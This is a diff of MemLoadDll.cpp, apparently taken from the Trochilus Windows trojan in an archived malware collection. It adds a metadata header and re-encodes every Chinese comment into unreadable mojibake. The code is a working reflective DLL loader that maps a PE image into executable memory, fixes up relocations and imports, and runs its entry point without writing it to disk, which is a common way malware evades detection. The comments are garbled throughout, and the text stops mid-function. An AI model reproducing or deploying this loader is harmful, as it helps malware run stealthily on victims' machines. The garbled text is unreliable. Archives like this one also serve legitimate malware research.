@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 // MemLoadDll.cpp: implementation of the CMemLoadDll class.
 //
 //////////////////////////////////////////////////////////////////////
@@ -26,35 +37,35 @@ CMemLoadDll::~CMemLoadDll()
 	{
 	//	ASSERT(m_pImageBase != NULL);
 	//	ASSERT(m_pDllMain   != NULL);
-		//ÍÑ¹³£¬×¼±¸Ð¶ÔØdll
+		//ï¿½Ñ¹ï¿½ï¿½ï¿½×¼ï¿½ï¿½Ð¶ï¿½ï¿½dll
 		m_pDllMain((HINSTANCE)m_pImageBase, DLL_PROCESS_DETACH, 0);
 		VirtualFree(m_pImageBase, 0, MEM_RELEASE);
 	}
 }
 
-//MemLoadLibraryº¯Êý´ÓÄÚ´æ»º³åÇøÊý¾ÝÖÐ¼ÓÔØÒ»¸ödllµ½µ±Ç°½ø³ÌµÄµØÖ·¿Õ¼ä£¬È±Ê¡Î»ÖÃ0x10000000
-//·µ»ØÖµ£º ³É¹¦·µ»ØTRUE , Ê§°Ü·µ»ØFALSE
-//lpFileData: ´æ·ÅdllÎÄ¼þÊý¾ÝµÄ»º³åÇø
-//nDataLength: »º³åÇøÖÐÊý¾ÝµÄ×Ü³¤¶È
+//MemLoadLibraryï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ú´æ»ºï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ð¼ï¿½ï¿½ï¿½Ò»ï¿½ï¿½dllï¿½ï¿½ï¿½ï¿½Ç°ï¿½ï¿½ï¿½ÌµÄµï¿½Ö·ï¿½Õ¼ä£¬È±Ê¡Î»ï¿½ï¿½0x10000000
+//ï¿½ï¿½ï¿½ï¿½Öµï¿½ï¿½ ï¿½É¹ï¿½ï¿½ï¿½ï¿½ï¿½TRUE , Ê§ï¿½Ü·ï¿½ï¿½ï¿½FALSE
+//lpFileData: ï¿½ï¿½ï¿½dllï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ÝµÄ»ï¿½ï¿½ï¿½ï¿½ï¿½
+//nDataLength: ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ýµï¿½ï¿½Ü³ï¿½ï¿½ï¿½
 BOOL CMemLoadDll::MemLoadLibrary(void* lpFileData, int nDataLength)
 {
 	if (m_pImageBase != NULL)
 	{
-		return FALSE;  //ÒÑ¾­¼ÓÔØÒ»¸ödll£¬»¹Ã»ÓÐÊÍ·Å£¬²»ÄÜ¼ÓÔØÐÂµÄdll
+		return FALSE;  //ï¿½Ñ¾ï¿½ï¿½ï¿½ï¿½ï¿½Ò»ï¿½ï¿½dllï¿½ï¿½ï¿½ï¿½Ã»ï¿½ï¿½ï¿½Í·Å£ï¿½ï¿½ï¿½ï¿½Ü¼ï¿½ï¿½ï¿½ï¿½Âµï¿½dll
 	}
-	//¼ì²éÊý¾ÝÓÐÐ§ÐÔ£¬²¢³õÊ¼»¯
+	//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ð§ï¿½Ô£ï¿½ï¿½ï¿½ï¿½ï¿½Ê¼ï¿½ï¿½
 	if (!CheckDataValide(lpFileData, nDataLength))
 	{
 		return FALSE;
 	}
-	//¼ÆËãËùÐèµÄ¼ÓÔØ¿Õ¼ä
+	//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½Ø¿Õ¼ï¿½
 	int nImageSize = CalcTotalImageSize();
 
 	if (nImageSize == 0)
 	{
 		return FALSE;
 	}
-	// ·ÖÅäÐéÄâÄÚ´æ
+	// ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ú´ï¿½
 	void *pMemoryAddress = VirtualAlloc(NULL, nImageSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
 	if (pMemoryAddress == NULL)
@@ -63,37 +74,37 @@ BOOL CMemLoadDll::MemLoadLibrary(void* lpFileData, int nDataLength)
 	}
 	else
 	{
-		CopyDllDatas(pMemoryAddress, lpFileData); //¸´ÖÆdllÊý¾Ý£¬²¢¶ÔÆëÃ¿¸ö¶Î
-		//ÖØ¶¨Î»ÐÅÏ¢
+		CopyDllDatas(pMemoryAddress, lpFileData); //ï¿½ï¿½ï¿½ï¿½dllï¿½ï¿½ï¿½Ý£ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ã¿ï¿½ï¿½ï¿½ï¿½
+		//ï¿½Ø¶ï¿½Î»ï¿½ï¿½Ï¢
 		if (m_pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress > 0
 			&& m_pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0)
 		{
 			DoRelocation(pMemoryAddress);
 		}
-		//Ìî³äÒýÈëµØÖ·±í
-		if (!FillRavAddress(pMemoryAddress)) //ÐÞÕýÒýÈëµØÖ·±íÊ§°Ü
+		//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ö·ï¿½ï¿½
+		if (!FillRavAddress(pMemoryAddress)) //ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ö·ï¿½ï¿½Ê§ï¿½ï¿½
 		{
 			VirtualFree(pMemoryAddress, 0, MEM_RELEASE);
 			return FALSE;
 		}
-		//ÐÞ¸ÄÒ³ÊôÐÔ¡£Ó¦¸Ã¸ù¾ÝÃ¿¸öÒ³µÄÊôÐÔµ¥¶ÀÉèÖÃÆä¶ÔÓ¦ÄÚ´æÒ³µÄÊôÐÔ¡£ÕâÀï¼ò»¯Ò»ÏÂ¡£
-		//Í³Ò»ÉèÖÃ³ÉÒ»¸öÊôÐÔPAGE_EXECUTE_READWRITE
+		//ï¿½Þ¸ï¿½Ò³ï¿½ï¿½ï¿½Ô¡ï¿½Ó¦ï¿½Ã¸ï¿½ï¿½ï¿½Ã¿ï¿½ï¿½Ò³ï¿½ï¿½ï¿½ï¿½ï¿½Ôµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ó¦ï¿½Ú´ï¿½Ò³ï¿½ï¿½ï¿½ï¿½ï¿½Ô¡ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ò»ï¿½Â¡ï¿½
+		//Í³Ò»ï¿½ï¿½ï¿½Ã³ï¿½Ò»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½PAGE_EXECUTE_READWRITE
 		unsigned long unOld;
 
 		VirtualProtect(pMemoryAddress, nImageSize, PAGE_EXECUTE_READWRITE, &unOld);
 	}
-	//ÐÞÕý»ùµØÖ·
+	//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ö·
 #ifdef WIN32
 	m_pNTHeader->OptionalHeader.ImageBase = (DWORD)pMemoryAddress;
 #else
 	m_pNTHeader->OptionalHeader.ImageBase = (ULONGULONG)pMemoryAddress;
 #endif
-	//½ÓÏÂÀ´Òªµ÷ÓÃÒ»ÏÂdllµÄÈë¿Úº¯Êý£¬×ö³õÊ¼»¯¹¤×÷¡£
+	//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Òªï¿½ï¿½ï¿½ï¿½Ò»ï¿½ï¿½dllï¿½ï¿½ï¿½ï¿½Úºï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ê¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 	m_pDllMain = (ProcDllMain)(m_pNTHeader->OptionalHeader.AddressOfEntryPoint + (PBYTE)pMemoryAddress);
 
 	BOOL InitResult = m_pDllMain((HINSTANCE)pMemoryAddress, DLL_PROCESS_ATTACH, 0);
 
-	if (!InitResult) //³õÊ¼»¯Ê§°Ü
+	if (!InitResult) //ï¿½ï¿½Ê¼ï¿½ï¿½Ê§ï¿½ï¿½
 	{
 		m_pDllMain((HINSTANCE)pMemoryAddress, DLL_PROCESS_DETACH, 0);
 		VirtualFree(pMemoryAddress, 0, MEM_RELEASE);
@@ -111,9 +122,9 @@ BOOL CMemLoadDll::IsLoadOk()
 	return m_bIsLoadOk;
 }
 
-//MemGetProcAddressº¯Êý´ÓdllÖÐ»ñÈ¡Ö¸¶¨º¯ÊýµÄµØÖ·
-//·µ»ØÖµ£º ³É¹¦·µ»Øº¯ÊýµØÖ· , Ê§°Ü·µ»ØNULL
-//lpProcName: Òª²éÕÒº¯ÊýµÄÃû×Ö»òÕßÐòºÅ
+//MemGetProcAddressï¿½ï¿½ï¿½ï¿½ï¿½ï¿½dllï¿½Ð»ï¿½È¡Ö¸ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Äµï¿½Ö·
+//ï¿½ï¿½ï¿½ï¿½Öµï¿½ï¿½ ï¿½É¹ï¿½ï¿½ï¿½ï¿½Øºï¿½ï¿½ï¿½ï¿½ï¿½Ö· , Ê§ï¿½Ü·ï¿½ï¿½ï¿½NULL
+//lpProcName: Òªï¿½ï¿½ï¿½Òºï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ö»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 FARPROC CMemLoadDll::MemGetProcAddress(LPCSTR lpProcName)
 {
 	if (m_pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0 ||
@@ -182,48 +193,48 @@ FARPROC CMemLoadDll::MemGetProcAddress(LPCSTR lpProcName)
 	
 }
 
-// ÖØ¶¨ÏòPEÓÃµ½µÄµØÖ·
+// ï¿½Ø¶ï¿½ï¿½ï¿½PEï¿½Ãµï¿½ï¿½Äµï¿½Ö·
 void CMemLoadDll::DoRelocation( void *pNewBase)
 {
-/* ÖØ¶¨Î»±íµÄ½á¹¹£º
-// DWORD sectionAddress, DWORD size (°üÀ¨±¾½ÚÐèÒªÖØ¶¨Î»µÄÊý¾Ý)
-// ÀýÈç 1000½ÚÐèÒªÐÞÕý5¸öÖØ¶¨Î»Êý¾ÝµÄ»°£¬ÖØ¶¨Î»±íµÄÊý¾ÝÊÇ
+/* ï¿½Ø¶ï¿½Î»ï¿½ï¿½ï¿½Ä½á¹¹ï¿½ï¿½
+// DWORD sectionAddress, DWORD size (ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Òªï¿½Ø¶ï¿½Î»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½)
+// ï¿½ï¿½ï¿½ï¿½ 1000ï¿½ï¿½ï¿½ï¿½Òªï¿½ï¿½ï¿½ï¿½5ï¿½ï¿½ï¿½Ø¶ï¿½Î»ï¿½ï¿½ï¿½ÝµÄ»ï¿½ï¿½ï¿½ï¿½Ø¶ï¿½Î»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 // 00 10 00 00   14 00 00 00      xxxx xxxx xxxx xxxx xxxx 0000
 // -----------   -----------      ----
-// ¸ø³ö½ÚµÄÆ«ÒÆ  ×Ü³ß´ç=8+6*2     ÐèÒªÐÞÕýµÄµØÖ·           ÓÃÓÚ¶ÔÆë4×Ö½Ú
-// ÖØ¶¨Î»±íÊÇÈô¸É¸öÏàÁ¬£¬Èç¹ûaddress ºÍ size¶¼ÊÇ0 ±íÊ¾½áÊø
-// ÐèÒªÐÞÕýµÄµØÖ·ÊÇ12Î»µÄ£¬¸ß4Î»ÊÇÐÎÌ¬×Ö£¬intel cpuÏÂÊÇ3
+// ï¿½ï¿½ï¿½ï¿½ï¿½Úµï¿½Æ«ï¿½ï¿½  ï¿½Ü³ß´ï¿½=8+6*2     ï¿½ï¿½Òªï¿½ï¿½ï¿½ï¿½ï¿½Äµï¿½Ö·           ï¿½ï¿½ï¿½Ú¶ï¿½ï¿½ï¿½4ï¿½Ö½ï¿½
+// ï¿½Ø¶ï¿½Î»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½É¸ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½address ï¿½ï¿½ sizeï¿½ï¿½ï¿½ï¿½0 ï¿½ï¿½Ê¾ï¿½ï¿½ï¿½ï¿½
+// ï¿½ï¿½Òªï¿½ï¿½ï¿½ï¿½ï¿½Äµï¿½Ö·ï¿½ï¿½12Î»ï¿½Ä£ï¿½ï¿½ï¿½4Î»ï¿½ï¿½ï¿½ï¿½Ì¬ï¿½Ö£ï¿½intel cpuï¿½ï¿½ï¿½ï¿½3
 	*/
-	//¼ÙÉèNewBaseÊÇ0x600000,¶øÎÄ¼þÖÐÉèÖÃµÄÈ±Ê¡ImageBaseÊÇ0x400000,ÔòÐÞÕýÆ«ÒÆÁ¿¾ÍÊÇ0x200000
+	//ï¿½ï¿½ï¿½ï¿½NewBaseï¿½ï¿½0x600000,ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ãµï¿½È±Ê¡ImageBaseï¿½ï¿½0x400000,ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Æ«ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½0x200000
 	
-	//×¢ÒâÖØ¶¨Î»±íµÄÎ»ÖÃ¿ÉÄÜºÍÓ²ÅÌÎÄ¼þÖÐµÄÆ«ÒÆµØÖ·²»Í¬£¬Ó¦¸ÃÊ¹ÓÃ¼ÓÔØºóµÄµØÖ·
+	//×¢ï¿½ï¿½ï¿½Ø¶ï¿½Î»ï¿½ï¿½ï¿½ï¿½Î»ï¿½Ã¿ï¿½ï¿½Üºï¿½Ó²ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½Ðµï¿½Æ«ï¿½Æµï¿½Ö·ï¿½ï¿½Í¬ï¿½ï¿½Ó¦ï¿½ï¿½Ê¹ï¿½Ã¼ï¿½ï¿½Øºï¿½Äµï¿½Ö·
 	PIMAGE_BASE_RELOCATION pLoc = (PIMAGE_BASE_RELOCATION)((unsigned long)pNewBase 
 		+ m_pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
 
-	while ((pLoc->VirtualAddress + pLoc->SizeOfBlock) != 0) //¿ªÊ¼É¨ÃèÖØ¶¨Î»±í
+	while ((pLoc->VirtualAddress + pLoc->SizeOfBlock) != 0) //ï¿½ï¿½Ê¼É¨ï¿½ï¿½ï¿½Ø¶ï¿½Î»ï¿½ï¿½
 	{
 		WORD *pLocData = (WORD *)((PBYTE)pLoc + sizeof(IMAGE_BASE_RELOCATION));
-		//¼ÆËã±¾½ÚÐèÒªÐÞÕýµÄÖØ¶¨Î»Ïî£¨µØÖ·£©µÄÊýÄ¿
+		//ï¿½ï¿½ï¿½ã±¾ï¿½ï¿½ï¿½ï¿½Òªï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ø¶ï¿½Î»ï¿½î£¨ï¿½ï¿½Ö·ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¿
 		int nNumberOfReloc = (pLoc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))/sizeof(WORD);
 
 		for ( int i=0 ; i < nNumberOfReloc; i++)
 		{
-			// Ã¿¸öWORDÓÉÁ½²¿·Ö×é³É¡£¸ß4Î»Ö¸³öÁËÖØ¶¨Î»µÄÀàÐÍ£¬WINNT.HÖÐµÄÒ»ÏµÁÐIMAGE_REL_BASED_xxx¶¨ÒåÁËÖØ¶¨Î»ÀàÐÍµÄÈ¡Öµ¡£
-			// µÍ12Î»ÊÇÏà¶ÔÓÚVirtualAddressÓòµÄÆ«ÒÆ£¬Ö¸³öÁË±ØÐë½øÐÐÖØ¶¨Î»µÄÎ»ÖÃ¡£
+			// Ã¿ï¿½ï¿½WORDï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½É¡ï¿½ï¿½ï¿½4Î»Ö¸ï¿½ï¿½ï¿½ï¿½ï¿½Ø¶ï¿½Î»ï¿½ï¿½ï¿½ï¿½ï¿½Í£ï¿½WINNT.Hï¿½Ðµï¿½Ò»Ïµï¿½ï¿½IMAGE_REL_BASED_xxxï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ø¶ï¿½Î»ï¿½ï¿½ï¿½Íµï¿½È¡Öµï¿½ï¿½
+			// ï¿½ï¿½12Î»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½VirtualAddressï¿½ï¿½ï¿½Æ«ï¿½Æ£ï¿½Ö¸ï¿½ï¿½ï¿½Ë±ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ø¶ï¿½Î»ï¿½ï¿½Î»ï¿½Ã¡ï¿½
 			if ((DWORD)(pLocData[i] & 0x0000F000) == 0x0000A000)
 			{
-				// 64Î»dllÖØ¶¨Î»£¬IMAGE_REL_BASED_DIR64
-				// ¶ÔÓÚIA-64µÄ¿ÉÖ´ÐÐÎÄ¼þ£¬ÖØ¶¨Î»ËÆºõ×ÜÊÇIMAGE_REL_BASED_DIR64ÀàÐÍµÄ¡£
+				// 64Î»dllï¿½Ø¶ï¿½Î»ï¿½ï¿½IMAGE_REL_BASED_DIR64
+				// ï¿½ï¿½ï¿½ï¿½IA-64ï¿½Ä¿ï¿½Ö´ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½Ø¶ï¿½Î»ï¿½Æºï¿½ï¿½ï¿½ï¿½ï¿½IMAGE_REL_BASED_DIR64ï¿½ï¿½ï¿½ÍµÄ¡ï¿½
 #ifdef _WIN64
 				ULONGLONG* pAddress = (ULONGLONG *)((PBYTE)pNewBase + pLoc->VirtualAddress + (pLocData[i] & 0x0FFF));
 				ULONGLONG ullDelta = (ULONGLONG)pNewBase - m_pNTHeader->OptionalHeader.ImageBase;
 				*pAddress += ullDelta;
 #endif
 			}
-			else if ((DWORD)(pLocData[i] & 0x0000F000) == 0x00003000) //ÕâÊÇÒ»¸öÐèÒªÐÞÕýµÄµØÖ·
+			else if ((DWORD)(pLocData[i] & 0x0000F000) == 0x00003000) //ï¿½ï¿½ï¿½ï¿½Ò»ï¿½ï¿½ï¿½ï¿½Òªï¿½ï¿½ï¿½ï¿½ï¿½Äµï¿½Ö·
 			{
-				// 32Î»dllÖØ¶¨Î»£¬IMAGE_REL_BASED_HIGHLOW
-				// ¶ÔÓÚx86µÄ¿ÉÖ´ÐÐÎÄ¼þ£¬ËùÓÐµÄ»ùÖ·ÖØ¶¨Î»¶¼ÊÇIMAGE_REL_BASED_HIGHLOWÀàÐÍµÄ¡£
+				// 32Î»dllï¿½Ø¶ï¿½Î»ï¿½ï¿½IMAGE_REL_BASED_HIGHLOW
+				// ï¿½ï¿½ï¿½ï¿½x86ï¿½Ä¿ï¿½Ö´ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ÐµÄ»ï¿½Ö·ï¿½Ø¶ï¿½Î»ï¿½ï¿½ï¿½ï¿½IMAGE_REL_BASED_HIGHLOWï¿½ï¿½ï¿½ÍµÄ¡ï¿½
 #ifndef _WIN64
 				DWORD* pAddress = (DWORD *)((PBYTE)pNewBase + pLoc->VirtualAddress + (pLocData[i] & 0x0FFF));
 				DWORD dwDelta = (DWORD)pNewBase - m_pNTHeader->OptionalHeader.ImageBase;
@@ -231,22 +242,22 @@ void CMemLoadDll::DoRelocation( void *pNewBase)
 #endif
 			}
 		}
-		//×ªÒÆµ½ÏÂÒ»¸ö½Ú½øÐÐ´¦Àí
+		//×ªï¿½Æµï¿½ï¿½ï¿½Ò»ï¿½ï¿½ï¿½Ú½ï¿½ï¿½Ð´ï¿½ï¿½ï¿½
 		pLoc = (PIMAGE_BASE_RELOCATION)((PBYTE)pLoc + pLoc->SizeOfBlock);
 	}
 }
 
-//Ìî³äÒýÈëµØÖ·±í
+//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ö·ï¿½ï¿½
 BOOL CMemLoadDll::FillRavAddress(void *pImageBase)
 {
-	// ÒýÈë±íÊµ¼ÊÉÏÊÇÒ»¸ö IMAGE_IMPORT_DESCRIPTOR ½á¹¹Êý×é£¬È«²¿ÊÇ0±íÊ¾½áÊø
-	// Êý×é¶¨ÒåÈçÏÂ£º
+	// ï¿½ï¿½ï¿½ï¿½ï¿½Êµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ò»ï¿½ï¿½ IMAGE_IMPORT_DESCRIPTOR ï¿½á¹¹ï¿½ï¿½ï¿½é£¬È«ï¿½ï¿½ï¿½ï¿½0ï¿½ï¿½Ê¾ï¿½ï¿½ï¿½ï¿½
+	// ï¿½ï¿½ï¿½é¶¨ï¿½ï¿½ï¿½ï¿½ï¿½Â£ï¿½
 	// 
-    // DWORD   OriginalFirstThunk;         // 0±íÊ¾½áÊø£¬·ñÔòÖ¸ÏòÎ´°ó¶¨µÄIAT½á¹¹Êý×é
+    // DWORD   OriginalFirstThunk;         // 0ï¿½ï¿½Ê¾ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ö¸ï¿½ï¿½Î´ï¿½ó¶¨µï¿½IATï¿½á¹¹ï¿½ï¿½ï¿½ï¿½
     // DWORD   TimeDateStamp; 
     // DWORD   ForwarderChain;             // -1 if no forwarders
-    // DWORD   Name;                       // ¸ø³ödllµÄÃû×Ö
-    // DWORD   FirstThunk;                 // Ö¸ÏòIAT½á¹¹Êý×éµÄµØÖ·(°ó¶¨ºó£¬ÕâÐ©IATÀïÃæ¾ÍÊÇÊµ¼ÊµÄº¯ÊýµØÖ·)
+    // DWORD   Name;                       // ï¿½ï¿½ï¿½ï¿½dllï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+    // DWORD   FirstThunk;                 // Ö¸ï¿½ï¿½IATï¿½á¹¹ï¿½ï¿½ï¿½ï¿½Äµï¿½Ö·(ï¿½ó¶¨ºï¿½ï¿½ï¿½Ð©IATï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Êµï¿½ÊµÄºï¿½ï¿½ï¿½ï¿½ï¿½Ö·)
 	unsigned long nOffset = m_pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress ;
 
 	if (nOffset == 0)
@@ -260,7 +271,7 @@ BOOL CMemLoadDll::FillRavAddress(void *pImageBase)
 	{
 		PIMAGE_THUNK_DATA pRealIAT = (PIMAGE_THUNK_DATA)((PBYTE)pImageBase + pID->FirstThunk);
 		PIMAGE_THUNK_DATA pOriginalIAT = (PIMAGE_THUNK_DATA)((PBYTE)pImageBase + pID->OriginalFirstThunk);
-		//»ñÈ¡dllµÄÃû×Ö
+		//ï¿½ï¿½È¡dllï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 		#define NAME_BUF_SIZE 256
 
 		char szBuf[NAME_BUF_SIZE] = ""; //dll name;
@@ -292,14 +303,14 @@ BOOL CMemLoadDll::FillRavAddress(void *pImageBase)
 			if (hDll == NULL) return FALSE;
 			//return FALSE; //NOT FOUND DLL
 		}
-		//»ñÈ¡DLLÖÐÃ¿¸öµ¼³öº¯ÊýµÄµØÖ·£¬ÌîÈëIAT
-		//Ã¿¸öIAT½á¹¹ÊÇ £º
+		//ï¿½ï¿½È¡DLLï¿½ï¿½Ã¿ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Äµï¿½Ö·ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½IAT
+		//Ã¿ï¿½ï¿½IATï¿½á¹¹ï¿½ï¿½ ï¿½ï¿½
 		// union { PBYTE  ForwarderString;
         //   PDWORD Function;
         //   DWORD Ordinal;
         //   PIMAGE_IMPORT_BY_NAME  AddressOfData;
 		// } u1;
-		// ³¤¶ÈÊÇÒ»¸öDWORD £¬ÕýºÃÈÝÄÉÒ»¸öµØÖ·¡£
+		// ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ò»ï¿½ï¿½DWORD ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ò»ï¿½ï¿½ï¿½ï¿½Ö·ï¿½ï¿½
 		for (i=0; ; i++)
 		{
 			if (pOriginalIAT[i].u1.Function == 0)
@@ -309,18 +320,18 @@ BOOL CMemLoadDll::FillRavAddress(void *pImageBase)
 
 			FARPROC lpFunction = NULL;
 
-			if (pOriginalIAT[i].u1.Ordinal & IMAGE_ORDINAL_FLAG) //ÕâÀïµÄÖµ¸ø³öµÄÊÇµ¼³öÐòºÅ
+			if (pOriginalIAT[i].u1.Ordinal & IMAGE_ORDINAL_FLAG) //ï¿½ï¿½ï¿½ï¿½ï¿½Öµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Çµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 			{
 				lpFunction = GetProcAddress(hDll, (LPCSTR)(pOriginalIAT[i].u1.Ordinal & 0x0000FFFF));
 			}
-			else //°´ÕÕÃû×Öµ¼Èë
+			else //ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Öµï¿½ï¿½ï¿½
 			{
-				//»ñÈ¡´ËIATÏîËùÃèÊöµÄº¯ÊýÃû³Æ
+				//ï¿½ï¿½È¡ï¿½ï¿½IATï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Äºï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 				PIMAGE_IMPORT_BY_NAME pByName = (PIMAGE_IMPORT_BY_NAME)((PBYTE)pImageBase + (pOriginalIAT[i].u1.AddressOfData));
 
 				lpFunction = GetProcAddress(hDll, (char *)pByName->Name);
 			}
-			if (lpFunction != NULL)   //ÕÒµ½ÁË£¡
+			if (lpFunction != NULL)   //ï¿½Òµï¿½ï¿½Ë£ï¿½
 			{
 #ifdef _WIN64
 				pRealIAT[i].u1.Function = (ULONGLONG)lpFunction;
@@ -341,32 +352,32 @@ BOOL CMemLoadDll::FillRavAddress(void *pImageBase)
 	return TRUE;
 }
 
-//CheckDataValideº¯ÊýÓÃÓÚ¼ì²é»º³åÇøÖÐµÄÊý¾ÝÊÇ·ñÓÐÐ§µÄdllÎÄ¼þ
-//·µ»ØÖµ£º ÊÇÒ»¸ö¿ÉÖ´ÐÐµÄdllÔò·µ»ØTRUE£¬·ñÔò·µ»ØFALSE¡£
-//lpFileData: ´æ·ÅdllÊý¾ÝµÄÄÚ´æ»º³åÇø
-//nDataLength: dllÎÄ¼þµÄ³¤¶È
+//CheckDataValideï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ú¼ï¿½é»ºï¿½ï¿½ï¿½ï¿½ï¿½Ðµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ç·ï¿½ï¿½ï¿½Ð§ï¿½ï¿½dllï¿½Ä¼ï¿½
+//ï¿½ï¿½ï¿½ï¿½Öµï¿½ï¿½ ï¿½ï¿½Ò»ï¿½ï¿½ï¿½ï¿½Ö´ï¿½Ðµï¿½dllï¿½ò·µ»ï¿½TRUEï¿½ï¿½ï¿½ï¿½ï¿½ò·µ»ï¿½FALSEï¿½ï¿½
+//lpFileData: ï¿½ï¿½ï¿½dllï¿½ï¿½ï¿½Ýµï¿½ï¿½Ú´æ»ºï¿½ï¿½ï¿½ï¿½
+//nDataLength: dllï¿½Ä¼ï¿½ï¿½Ä³ï¿½ï¿½ï¿½
 BOOL CMemLoadDll::CheckDataValide(void* lpFileData, int nDataLength)
 {
-	//¼ì²é³¤¶È
+	//ï¿½ï¿½é³¤ï¿½ï¿½
 	if (nDataLength < sizeof(IMAGE_DOS_HEADER))
 	{
 		return FALSE;
 	}
 	m_pDosHeader = (PIMAGE_DOS_HEADER)lpFileData;  // DOSÍ·
-	//¼ì²édosÍ·µÄ±ê¼Ç
+	//ï¿½ï¿½ï¿½dosÍ·ï¿½Ä±ï¿½ï¿½
 	if (m_pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
 	{
 		return FALSE;  //0x5A4D : MZ
 	}
 	
-	//¼ì²é³¤¶È
+	//ï¿½ï¿½é³¤ï¿½ï¿½
 	if ((DWORD)nDataLength < (m_pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS)))
 	{
 		return FALSE;
 	}
-	//È¡µÃpeÍ·
+	//È¡ï¿½ï¿½peÍ·
 	m_pNTHeader = (PIMAGE_NT_HEADERS)((PBYTE)lpFileData + m_pDosHeader->e_lfanew); // PEÍ·
-	//¼ì²épeÍ·µÄºÏ·¨ÐÔ
+	//ï¿½ï¿½ï¿½peÍ·ï¿½ÄºÏ·ï¿½ï¿½ï¿½
 	if (m_pNTHeader->Signature != IMAGE_NT_SIGNATURE)
 	{
 		return FALSE;  //0x00004550 : PE00
@@ -375,7 +386,7 @@ BOOL CMemLoadDll::CheckDataValide(void* lpFileData, int nDataLength)
 	{
 		return FALSE;  
 	}
-	if ((m_pNTHeader->FileHeader.Characteristics & IMAGE_FILE_EXECUTABLE_IMAGE) == 0) //0x0002 : Ö¸³öÎÄ¼þ¿ÉÒÔÔËÐÐ
+	if ((m_pNTHeader->FileHeader.Characteristics & IMAGE_FILE_EXECUTABLE_IMAGE) == 0) //0x0002 : Ö¸ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 	{
